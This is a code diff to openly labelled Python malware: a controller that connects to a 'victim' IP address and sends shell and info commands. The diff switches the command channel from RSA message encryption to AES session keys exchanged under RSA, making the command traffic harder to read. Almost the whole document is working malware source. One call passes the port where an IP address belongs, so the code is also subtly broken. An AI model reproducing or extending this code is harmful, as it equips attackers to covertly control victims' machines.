@@ -2,7 +2,15 @@ import threading
 import time
 import socket
 import sys
-
+import pyaes
+import string
+import random
+import base64
+import hashlib
+from Crypto import Random
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+from Crypto.Util.Padding import unpad
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.backends import default_backend
@@ -23,11 +31,32 @@ def print_help():
     print('Usage : python3 <program_name> <victim_IP_address>')
 
 
+class AESCipher(object):
+
+    def __init__(self, key):
+        self.bs = 32
+        self.key = hashlib.sha256(key.encode()).digest()
+
+    def encrypt(self, raw):
+        raw = pad(raw, self.bs)
+        iv = Random.new().read(AES.block_size)
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        return base64.b64encode(iv + cipher.encrypt(raw))
+
+    def decrypt(self, enc):
+        enc = base64.b64decode(enc)
+        iv = enc[:AES.block_size]
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        return unpad(cipher.decrypt(enc[AES.block_size:]), self.bs).decode('utf-8')
+
+
 class InThread(threading.Thread):
-    def __init__(self, ip, in_port=IN_PORT):
+    def __init__(self, ip, key, aes, in_port=IN_PORT):
         super().__init__()
         self.in_port = in_port
         self.ip = ip
+        self.key = key
+        self.aes = aes
 
         try:
             self.socket = socket.socket()
@@ -46,7 +75,8 @@ class InThread(threading.Thread):
     def run(self):
         again = True
         while again:
-            msg = self.rsa_decrypt(self.conn.recv(1024)).decode('UTF-8')
+            #msg = self.rsa_decrypt(self.conn.recv(1024)).decode('UTF-8')
+            msg = self.aes.decrypt(self.conn.recv(32768))
             if msg == 'exit':
                 again = False
             else:
@@ -81,10 +111,12 @@ class InThread(threading.Thread):
 
 
 class OutThread(threading.Thread):
-    def __init__(self, ip, out_port: int):
+    def __init__(self, ip, out_port: int, key, aes):
         super().__init__()
         self.ip = ip
         self.out_port = out_port
+        self.key = key
+        self.aes = aes
 
         try:
             self.sock = socket.socket()
@@ -98,6 +130,8 @@ class OutThread(threading.Thread):
 
     def run(self):
         known_commands = ['exit', 'shell', 'info']
+        time.sleep(2)
+        self.sendkey()
         again = True
         while again:
             time.sleep(1)
@@ -132,9 +166,16 @@ class OutThread(threading.Thread):
 
     def send(self, message):
         try:
-            self.sock.sendall(self.rsa_encrypt(message.encode('UTF-8')))
+            #self.sock.sendall(self.rsa_encrypt(message.encode('UTF-8')))
+            self.sock.sendall(self.aes.encrypt(message.encode('UTF-8')))
         except ConnectionError:
             print('Unable to send <<{}>> to {}'.format(message, self.ip))
+
+    def sendkey(self):
+        try:
+            self.sock.send(self.rsa_encrypt(self.key.encode('UTF-8')))
+        except ConnectionError:
+            print('Unable to send session key')
 
     def send_public_keys(self):
         try:
@@ -167,8 +208,11 @@ class Malware():
         private_key = self.generate_rsa_keys()
         public_key_pem = self.serialize_public_key(private_key.public_key())
 
-        self.cons = OutThread(self.ip, self.out_port)
-        self.prod = InThread(self.in_port)
+        aeskey = (''.join([random.choice(string.ascii_letters + string.digits) for n in range(32)]))
+        aes = AESCipher(aeskey)
+
+        self.cons = OutThread(self.ip, self.out_port, aeskey, aes)
+        self.prod = InThread(self.in_port, aeskey, aes)
 
     def run(self):
         self.prod.start()
@@ -195,8 +239,18 @@ class Malware():
             format=serialization.PublicFormat.SubjectPublicKeyInfo)
 
 
+"""
+Checks if argument is valid and Invokes Malware Thread
+"""
 if len(sys.argv) == 2:
     ip = sys.argv[1]
-    malw = Malware(ip)
+    try:
+        socket.inet_aton(ip)
+    except socket.error:
+        print('Invalid IP address. Please try again')
+        print_help()
+    else:
+        malw = Malware(ip)
+
 else:
     print_help()
